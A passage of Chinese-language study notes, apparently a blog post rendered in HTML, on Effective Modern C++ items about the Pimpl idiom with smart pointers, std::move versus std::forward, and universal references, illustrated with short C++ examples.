class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                          <span class="hljs-comment">//仍然在“widget.h”中</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    ~Widget();<br><br>    Widget(Widget&amp;&amp; rhs);               <span class="hljs-comment">//只有声明</span><br>    Widget&amp; <span class="hljs-keyword">operator</span>=(Widget&amp;&amp; rhs);<br>    …<br><br><span class="hljs-keyword">private</span>:                                <span class="hljs-comment">//跟之前一样</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Impl&gt; pImpl;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;                   //跟之前一样，仍然在“widget.cpp”中</span></span><br>…<br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Widget</span>:</span>:Impl &#123; … &#125;;          <span class="hljs-comment">//跟之前一样</span><br><br>Widget::Widget()                    <span class="hljs-comment">//跟之前一样</span><br>: pImpl(<span class="hljs-built_in">std</span>::make_unique&lt;Impl&gt;())<br>&#123;&#125;<br><br>Widget::~Widget() = <span class="hljs-keyword">default</span>;        <span class="hljs-comment">//跟之前一样</span><br><br>Widget::Widget(Widget&amp;&amp; rhs) = <span class="hljs-keyword">default</span>;             <span class="hljs-comment">//这里定义</span><br>Widget&amp; Widget::<span class="hljs-keyword">operator</span>=(Widget&amp;&amp; rhs) = <span class="hljs-keyword">default</span>;<br></code></pre></div></td></tr></table></figure><h3><span id="拷贝">拷贝</span></h3><p>对于 <code>struct Impl</code>中数据成员，可以使用默认拷贝函数，完成拷贝动作。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                          <span class="hljs-comment">//仍然在“widget.h”中</span><br><span class="hljs-keyword">public</span>:<br>    …<br><br>    Widget(<span class="hljs-keyword">const</span> Widget&amp; rhs);          <span class="hljs-comment">//只有声明</span><br>    Widget&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Widget&amp; rhs);<br><br><span class="hljs-keyword">private</span>:                                <span class="hljs-comment">//跟之前一样</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Impl&gt; pImpl;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;                   //跟之前一样，仍然在“widget.cpp”中</span></span><br>…<br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Widget</span>:</span>:Impl &#123; … &#125;;          <span class="hljs-comment">//跟之前一样</span><br><br>Widget::~Widget() = <span class="hljs-keyword">default</span>;<span class="hljs-comment">//其他函数，跟之前一样</span><br><br>Widget::Widget(<span class="hljs-keyword">const</span> Widget&amp; rhs)   <span class="hljs-comment">//拷贝构造函数</span><br>: pImpl(<span class="hljs-built_in">std</span>::make_unique&lt;Impl&gt;(*rhs.pImpl))<br>&#123;&#125;<br><br>Widget&amp; Widget::<span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Widget&amp; rhs)    <span class="hljs-comment">//拷贝operator=</span><br>&#123;<br>    *pImpl = *rhs.pImpl;<br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>利用了编译器会为我们自动生成结构体<code>Impl</code>的复制操作函数的机制，而不是逐一复制结构体<code>Impl</code>的成员，自动生成的复制操作能自动复制每一个成员。</p><h3><span id="stdshared_ptr"><code>std::shared_ptr</code></span></h3><p>如果我们使用<code>std::shared_ptr</code>而不是<code>std::unique_ptr</code>来做<code>pImpl</code>指针，本条款的建议不再适用。</p><p>不需要在类<code>Widget</code>里声明析构函数，没有了用户定义析构函数，编译器将会成移动操作，并且将会如我们所期望般工作。<code>widget.h</code>里的代码如下，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                      <span class="hljs-comment">//在“widget.h”中</span><br><span class="hljs-keyword">public</span>:<br>    Widget();<br>    …                               <span class="hljs-comment">//没有析构函数和移动操作的声明</span><br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Impl</span>;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Impl&gt; pImpl;    <span class="hljs-comment">//用std::shared_ptr</span><br>&#125;;                                  <span class="hljs-comment">//而不是std::unique_ptr</span><br></code></pre></div></td></tr></table></figure><p>这是<code>#include</code>了<code>widget.h</code>的客户代码，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w1;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">w2</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::move(w1))</span></span>;     <span class="hljs-comment">//移动构造w2</span><br>w1 = <span class="hljs-built_in">std</span>::move(w2);         <span class="hljs-comment">//移动赋值w1</span><br></code></pre></div></td></tr></table></figure><p>这些都能编译，并且工作地如我们所望：<code>w1</code>将会被默认构造，它的值会被移动进<code>w2</code>，随后值将会被移动回<code>w1</code>，然后两者都会被销毁（指向的<code>Widget::Impl</code>对象一并也被销毁）。</p><p><code>std::unique_ptr</code>和<code>std::shared_ptr</code>在<code>pImpl</code>指针上的表现上的区别的深层原因在于，他们支持自定义删除器的方式不同。</p><p>对<code>std::unique_ptr</code>而言，删除器的类型是这个智能指针的一部分，这让编译器有可能生成更小的运行时数据结构和更快的运行代码。这种更高效率的后果之一就是<code>std::unique_ptr</code>指向的类型，在编译器的生成特殊成员函数（如析构函数，移动操作）被调用时，必须已经是一个完成类型。</p><p>而对<code>std::shared_ptr</code>而言，删除器的类型不是该智能指针的一部分，这让它会生成更大的运行时数据结构和稍微慢点的代码，但是当编译器生成的特殊成员函数被使用的时候，指向的对象不必是一个完成类型。</p><h3><span id="结论">结论</span></h3><ul><li>Pimpl惯用法通过减少在类实现和类使用者之间的编译依赖来减少编译时间。</li><li>对于<code>std::unique_ptr</code>类型的<code>pImpl</code>指针，需要在头文件的类里声明特殊成员函数，并在实现文件中<code>struct Impl</code>定义之后来实现他们。即使是编译器自动生成的代码可以工作，也要这么做。</li><li>以上的建议只适用于<code>std::unique_ptr</code>，不适用于<code>std::shared_ptr</code>。</li></ul><h2><span id="23理解stdmove和stdforward">23理解<code>std::move</code>和<code>std::forward</code></span></h2><h3><span id="intro">Intro</span></h3><ul><li><p><strong>移动语义</strong>使编译器有可能用廉价的移动操作来代替昂贵的拷贝操作。正如拷贝构造函数和拷贝赋值操作符给了你控制拷贝语义的权力，移动构造函数和移动赋值操作符也给了你控制移动语义的权力。移动语义也允许创建只可移动（<em>move-only</em>）的类型，例如<code>std::unique_ptr</code>，<code>std::future</code>和<code>std::thread</code>。</p></li><li><p><strong>完美转发</strong>使接收任意数量实参的函数模板成为可能，它可以将实参转发到其他的函数，使目标函数接收到的实参与被传递给转发函数的实参保持一致。</p></li><li><p><strong>右值引用</strong>是连接这两个截然不同的概念的胶合剂。它是使移动语义和完美转发变得可能的基础语言机制。</p></li></ul><p>但是，<code>std::move</code>并不移动任何东西，完美转发也并不完美。移动操作并不永远比复制操作更廉价。构造“<code>type&amp;&amp;</code>”也并非总是代表一个右值引用。</p><p>非常重要的一点是要牢记形参永远是<strong>左值</strong>，即使它的类型是一个右值引用。比如，假设</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(Widget&amp;&amp; w)</span></span>;<br></code></pre></div></td></tr></table></figure><p>形参<code>w</code>是一个左值，即使它的类型是一个rvalue-reference-to-<code>Widget</code>。</p><h3><span id="stdmove和stdforward不会做什么"><code>std::move</code>和<code>std::forward</code>不会做什么</span></h3><p><code>std::move</code>不移动（move）任何东西，<code>std::forward</code>也不转发（forward）任何东西。在运行时，它们不做任何事情。它们不产生任何可执行代码，一字节也没有。</p><h3><span id="stdmove"><code>std::move</code></span></h3><p>C++11的<code>std::move</code>的示例实现。它并不完全满足标准细则，但是它已经非常接近了。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                            <br><span class="hljs-keyword">typename</span> remove_reference&lt;T&gt;::type&amp;&amp;<br>move(T&amp;&amp; param)<br>&#123;<br>    <span class="hljs-keyword">using</span> ReturnType =                          <br>        <span class="hljs-keyword">typename</span> remove_reference&lt;T&gt;::type&amp;&amp;;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;ReturnType&gt;(param);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>该函数返回类型的<code>&amp;&amp;</code>部分表明<code>std::move</code>函数返回的是一个右值引用，但是，如果类型<code>T</code>恰好是一个左值引用，那么<code>T&amp;&amp;</code>将会成为一个左值引用。</p><p>所以，使用 <code>std::remove_reference</code>，得到ReturnType。这保证了<code>std::move</code>返回的真的是右值引用。</p><p><code>std::move</code>在C++14中可以被更简单地实现。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">decltype</span>(<span class="hljs-keyword">auto</span>) <span class="hljs-title">move</span><span class="hljs-params">(T&amp;&amp; param)</span>          <span class="hljs-comment">//在std命名空间</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">using</span> ReturnType = <span class="hljs-keyword">remove_referece_t</span>&lt;T&gt;&amp;&amp;;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;ReturnType&gt;(param);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>因此，<code>std::move</code>将它的实参转换为一个右值，这就是它的全部作用。</p><h3><span id="const-的限制"><code>const</code> 的限制</span></h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Annotation</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Annotation</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> text)</span></span><br>    ：value(std::move(text))    //“移动”text到value里；这段代码执行起来<br>    &#123; … &#125;                       <span class="hljs-comment">//并不是看起来那样</span><br>    <br>    …<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> value;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这段代码可以编译，可以链接，可以运行。</p><p><code>text</code>通过<code>std::move</code>被转换到右值，但是<code>text</code>被声明为<code>const std::string</code>，所以在转换之前，<code>text</code>是一个左值的<code>const std::string</code>，而转换的结果是一个右值的<code>const std::string</code></p><p>那么，string 对 <code>value</code> 赋值时，调用的是哪个构造函数？</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">string</span> &#123;</span>                  <span class="hljs-comment">//std::string事实上是</span><br><span class="hljs-keyword">public</span>:                         <span class="hljs-comment">//std::basic_string&lt;char&gt;的类型别名</span><br>    …<br>    <span class="hljs-built_in">string</span>(<span class="hljs-keyword">const</span> <span class="hljs-built_in">string</span>&amp; rhs);  <span class="hljs-comment">//拷贝构造函数</span><br>    <span class="hljs-built_in">string</span>(<span class="hljs-built_in">string</span>&amp;&amp; rhs);       <span class="hljs-comment">//移动构造函数</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>右值不能被传递给<code>std::string</code>的移动构造函数，因为移动构造函数只接受一个指向<strong>non-<code>const</code></strong>的<code>std::string</code>的右值引用。</p><p>该右值却可以被传递给<code>std::string</code>的拷贝构造函数，因为<code>lvalue-reference-to-const</code>允许被绑定到一个<code>const</code>右值上。因此，<code>std::string</code>在成员初始化的过程中调用了<strong>拷贝</strong>构造函数。</p><p>可以总结出两点：</p><p>第一，不要在你希望能移动对象的时候，声明他们为<code>const</code>。</p><p>第二，<code>std::move</code>不仅不移动任何东西，而且它也不保证它执行转换的对象可以被移动。</p><h3><span id="stdforward"><code>std::forward</code></span></h3><p>与<code>std::move</code>总是<strong>无条件</strong>的将它的实参为右值不同，<code>std::forward</code>是<strong>有条件</strong>的转换。</p><p>最常见的情景是一个模板函数，接收一个通用引用形参（T&amp;&amp;），并将它传递给另外的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Widget&amp; lvalArg)</span></span>;        <span class="hljs-comment">//处理左值</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(Widget&amp;&amp; rvalArg)</span></span>;             <span class="hljs-comment">//处理右值</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;                        <span class="hljs-comment">//用以转发param到process的模板</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">logAndProcess</span><span class="hljs-params">(T&amp;&amp; param)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> now =                              <span class="hljs-comment">//获取现在时间</span><br>        <span class="hljs-built_in">std</span>::chrono::system_clock::now();<br>    <br>    makeLogEntry(<span class="hljs-string">"Calling 'process'"</span>, now);<br>    process(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(param));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>考虑两次对<code>logAndProcess</code>的调用，一次左值为实参，一次右值为实参：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w;<br><br>logAndProcess(w);               <span class="hljs-comment">//用左值调用</span><br>logAndProcess(<span class="hljs-built_in">std</span>::move(w));    <span class="hljs-comment">//用右值调用</span><br></code></pre></div></td></tr></table></figure><p><code>std::forward</code> 将保留实参的值类型，传递到 process函数，调用正确的函数重载。</p><h3><span id="对比">对比</span></h3><p>考虑一个类，我们希望统计有多少次移动构造函数被调用了。我们只需要一个<code>static</code>的计数器，它会在移动构造的时候自增。假设在这个类中，唯一一个非静态的数据成员是<code>std::string</code>，一种经典的移动构造函数（即，使用<code>std::move</code>）可以被实现如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    Widget(Widget&amp;&amp; rhs)<br>    : s(<span class="hljs-built_in">std</span>::move(rhs.s))<br>    &#123; ++moveCtorCalls; &#125;<br><br>    …<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span> moveCtorCalls;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> s;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>如果要用<code>std::forward</code>来达成同样的效果，代码可能会看起来像：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    Widget(Widget&amp;&amp; rhs)                    <span class="hljs-comment">//不自然，不合理的实现</span><br>    : s(<span class="hljs-built_in">std</span>::forward&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt;(rhs.s))<br>    &#123; ++moveCtorCalls; &#125;<br><br>    …<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>std::forward</code>不但需要一个函数实参（<code>rhs.s</code>），还需要一个模板类型实参<code>std::string</code>。</p><p><code>std::move</code>的使用代表着无条件向右值的转换，而使用<code>std::forward</code>只对绑定了右值的引用进行到右值转换。这是两种完全不同的动作。前者是典型地为了移动操作，而后者只是传递（亦为转发）一个对象到另外一个函数，保留它原有的左值属性或右值属性。</p><h3><span id="结论">结论</span></h3><ul><li><code>std::move</code>执行到右值的无条件的转换，但就自身而言，它不移动任何东西。</li><li><code>std::forward</code>只有当它的参数被绑定到一个右值时，才将参数转换为右值。</li><li><code>std::move</code>和<code>std::forward</code>在运行期什么也不做。</li></ul><h2><span id="24-区分通用引用与右值引用">24 区分通用引用与右值引用</span></h2><p>为了声明一个指向某个类型<code>T</code>的右值引用，你写下了<code>T&amp;&amp;</code>。但是，这不一定是一个右值引用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(Widget&amp;&amp; param)</span></span>;             <span class="hljs-comment">//右值引用</span><br>Widget&amp;&amp; var1 = Widget();           <span class="hljs-comment">//右值引用</span><br><span class="hljs-keyword">auto</span>&amp;&amp; var2 = var1;                 <span class="hljs-comment">//不是右值引用</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;T&gt;&amp;&amp; param)</span></span>;     <span class="hljs-comment">//右值引用</span><br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp;&amp; param)</span></span>;                  <span class="hljs-comment">//不是右值引用</span><br></code></pre></div></td></tr></table></figure><p>“<code>T&amp;&amp;</code>”有两种不同的意思。第一种，当然是右值引用。它们只绑定到右值上，并且它们主要的存在原因就是为了识别可以移动操作的对象。</p><p>“<code>T&amp;&amp;</code>”的另一种意思是，它既可以是右值引用，也可以是左值引用。它们的二重性使它们既可以绑定到右值上（就像右值引用），也可以绑定到左值上（就像左值引用）。此外，它们还可以绑定到<code>const</code>或者non-<code>const</code>的对象上，也可以绑定到<code>volatile</code>或者non-<code>volatile</code>的对象上，甚至可以绑定到既<code>const</code>又<code>volatile</code>的对象上。它们可以绑定到几乎任何东西。它叫做<strong>通用引用</strong>（<em>universalreferences</em>）。</p><blockquote><p>一些C++社区的成员已经开始将这种通用引用称之为<strong>转发引用</strong>（<em>forwardingreferences</em>）</p><p>通用引用，其特性是<strong>引用折叠</strong>决定的。</p></blockquote><h3><span id="初始化">初始化</span></h3><p>通用引用是引用，所以它们必须被初始化。一个通用引用的初始值决定了它是代表了右值引用还是左值引用。如果初始值是一个右值，那么通用引用就会是对应的右值引用，如果初始值是一个左值，那么通用引用就会是一个左值引用。对那些是函数形参的通用引用来说，初始值在调用函数的时候被提供：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp;&amp; param)</span></span>;              <span class="hljs-comment">//param是一个通用引用</span><br><br>Widget w;<br>f(w);                           <span class="hljs-comment">//传递给函数f一个左值；param的类型</span><br>                                <span class="hljs-comment">//将会是Widget&amp;，也即左值引用</span><br><br>f(<span class="hljs-built_in">std</span>::move(w));                <span class="hljs-comment">//传递给f一个右值；param的类型会是</span><br>                                <span class="hljs-comment">//Widget&amp;&amp;，即右值引用</span><br></code></pre></div></td></tr></table></figure><p>对一个通用引用而言，类型推导是必要的，但是其必须是<code>T&amp;&amp;</code> 形式，如果是<code>std::vector&lt;T&gt;&amp;&amp;</code> 的形式，那就变成了右值引用。</p><p>而如果传入左值，那么是不能传入右值参数的。</p><h3><span id="一个例子">一个例子</span></h3><p>考虑如下<code>push_back</code>成员函数，来自<code>std::vector</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-title">class</span> <span class="hljs-title">Allocator</span> = <span class="hljs-title">allocator</span>&lt;T&gt;&gt;   //来自<span class="hljs-title">C</span>++标准</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">vector</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">push_back</span><span class="hljs-params">(T&amp;&amp; x)</span></span>;<br>    …<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>push_back</code>函数的形参当然有一个通用引用的正确形式，然而，在这里并没有发生类型推导。类型推导发生在vector 实例化时。</p><p>作为对比，<code>std::vector</code>内的概念上相似的成员函数<code>emplace_back</code>，却确实包含类型推导:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>, <span class="hljs-title">class</span> <span class="hljs-title">Allocator</span> = <span class="hljs-title">allocator</span>&lt;T&gt;&gt;   //依旧来自<span class="hljs-title">C</span>++标准</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">vector</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span>... <span class="hljs-title">Args</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-title">void</span> <span class="hljs-title">emplace_back</span>(<span class="hljs-title">Args</span>&amp;&amp;... <span class="hljs-title">args</span>);</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>类型参数（<em>typeparameter</em>）<code>Args</code>是独立于<code>vector</code>的类型参数<code>T</code>的，所以<code>Args</code>会在每次<code>emplace_back</code>被调用的时候被推导。</p><p>所以，此时是一个通用引用。</p><h3><span id="autoampamp">auto&amp;&amp;</span></h3><p>类型声明为<code>auto&amp;&amp;</code>的变量是通用引用，因为会发生类型推导，并且它们具有正确形式(<code>T&amp;&amp;</code>)。<code>auto</code>类型的通用引用不如函数模板形参中的通用引用常见，但是它们在C++11中常常突然出现。而它们在C++14中出现得更多，因为C++14的<em>lambda</em>表达式可以声明<code>auto&amp;&amp;</code>类型的形参。</p><p>举个例子，如果你想写一个C++14标准的<em>lambda</em>表达式，来记录任意函数调用的时间开销，你可以这样写：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> timeFuncInvocation =<br>    [](<span class="hljs-keyword">auto</span>&amp;&amp; func, <span class="hljs-keyword">auto</span>&amp;&amp;... params)           <span class="hljs-comment">//C++14</span><br>    &#123;<br>        start timer;<br>        <span class="hljs-built_in">std</span>::forward&lt;<span class="hljs-keyword">decltype</span>(func)&gt;(func)(     <span class="hljs-comment">//对params调用func</span><br>            <span class="hljs-built_in">std</span>::forward&lt;delctype(params)&gt;(params)...<br>        );<br>        stop timer <span class="hljs-keyword">and</span> record elapsed time;<br>    &#125;;<br></code></pre></div></td></tr></table></figure><h3><span 